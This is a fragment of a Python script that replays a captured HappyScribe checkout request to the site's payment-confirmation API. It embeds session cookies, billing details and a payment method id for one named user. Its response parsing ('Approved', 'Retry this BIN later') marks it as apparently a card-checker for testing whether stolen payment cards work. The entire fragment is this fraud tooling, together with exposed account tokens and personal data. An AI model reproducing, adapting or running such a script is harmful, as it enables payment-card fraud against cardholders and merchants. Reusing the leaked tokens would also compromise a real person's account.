remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3; unsecure_is_signed_in=1; _cioid=11296645; intercom-device-id-frdatdus=65896fd8-9074-419f-82af-44775a9800f5; __stripe_mid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5; __stripe_sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d; _gat_UA-97995424-1=1; _ga=GA1.1.1213546217.1716898279; _ga_4T8KCV9Y2D=GS1.1.1716911386.2.1.1716911702.60.0.0; intercom-session-frdatdus=WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d; _transcribe_session=GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/10807386/checkout?new_subscription_interval=month&plan=pro_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'id': 10486458,
    'address': '9350 N Central Expy',
    'name': 'yusuf',
    'country': 'US',
    'vat': None,
    'billing_account_id': 10486458,
    'last4': '9305',
    'orderReference': 'nljannd',
    'user_id': 11296645,
    'organization_id': 10807386,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'pro_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	print(response.json())

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	